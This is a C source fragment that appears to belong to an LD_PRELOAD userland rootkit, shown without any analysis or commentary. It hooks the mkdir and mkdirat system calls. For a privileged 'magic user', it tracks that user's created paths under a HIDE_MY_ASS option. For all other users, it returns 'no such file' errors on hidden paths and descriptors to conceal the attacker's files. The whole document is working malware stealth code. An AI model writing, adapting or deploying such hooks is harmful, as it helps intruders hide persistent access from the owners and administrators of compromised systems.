int mkdir(const char *pathname, mode_t mode){
    hook(CMKDIR);

    if(magicusr()){
#ifdef HIDE_MY_ASS
        int ret = (long)call(CMKDIR, pathname, mode);
        if(ret){
            int outfd = fileno(stdout);
            if(!outfd) return ret;
            if(isatty(outfd))
                if(!pathtracked(pathname))
                    trackwrite(pathname);
        }
        return ret;
#else
        return (long)call(CMKDIR, pathname, mode);
#endif
    }
    if(hidden_path(pathname)) { errno = ENOENT; return -1; }
    return (long)call(CMKDIR, pathname, mode);
}

int mkdirat(int dirfd, const char *pathname, mode_t mode){
    hook(CMKDIRAT);

    if(magicusr()){
#ifdef HIDE_MY_ASS
        int ret = (long)call(CMKDIRAT, dirfd, pathname, mode);
        if(ret){
            int outfd = fileno(stdout);
            if(!outfd) return ret;
            if(isatty(outfd)){
                char *dname = gdirname(dirfd);
                if(dname){
                    if(!pathtracked(dname))
                        trackwrite(dname);
                    free(dname);
                }

                if(!pathtracked(pathname))
                    trackwrite(pathname);
            }
        }
        return ret;
#else
        return (long)call(CMKDIRAT, dirfd, pathname, mode);
#endif
    }
    if(hidden_path(pathname) || hidden_fd(dirfd)) { errno = ENOENT; return -1; }
    return (long)call(CMKDIRAT, dirfd, pathname, mode);
}